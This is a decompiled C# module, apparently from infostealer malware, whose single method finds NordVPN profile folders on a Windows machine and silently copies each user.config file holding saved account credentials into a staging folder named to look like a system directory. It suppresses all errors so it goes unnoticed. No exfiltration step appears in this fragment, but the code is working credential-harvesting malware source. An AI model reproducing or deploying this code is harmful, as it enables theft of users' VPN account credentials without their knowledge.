using System;
using System.IO;

namespace Nordvpn
{
	// Token: 0x02000009 RID: 9
	internal class nord
	{
		// Token: 0x0600000F RID: 15 RVA: 0x000029BC File Offset: 0x00000BBC
		public static void vpn()
		{
			try
			{
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
				bool flag = Directory.Exists(folderPath + "\\NordVPN");
				if (flag)
				{
					string[] directories = Directory.GetDirectories(folderPath + "\\NordVPN");
					Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\VPN\\NordVPN");
					foreach (string text in directories)
					{
						bool flag2 = text.StartsWith(folderPath + "\\NordVPN\\NordVPN.exe");
						if (flag2)
						{
							string name = new DirectoryInfo(text).Name;
							string[] directories2 = Directory.GetDirectories(text);
							Directory.CreateDirectory(string.Concat(new string[]
							{
								Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
								"\\Windows\\VPN\\NordVPN\\",
								name,
								"\\",
								new DirectoryInfo(directories2[0]).Name
							}));
							File.Copy(directories2[0] + "\\user.config", string.Concat(new string[]
							{
								Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
								"\\Windows\\VPN\\NordVPN\\",
								name,
								"\\",
								new DirectoryInfo(directories2[0]).Name,
								"\\user.config"
							}));
						}
					}
				}
			}
			catch
			{
			}
		}
	}
}
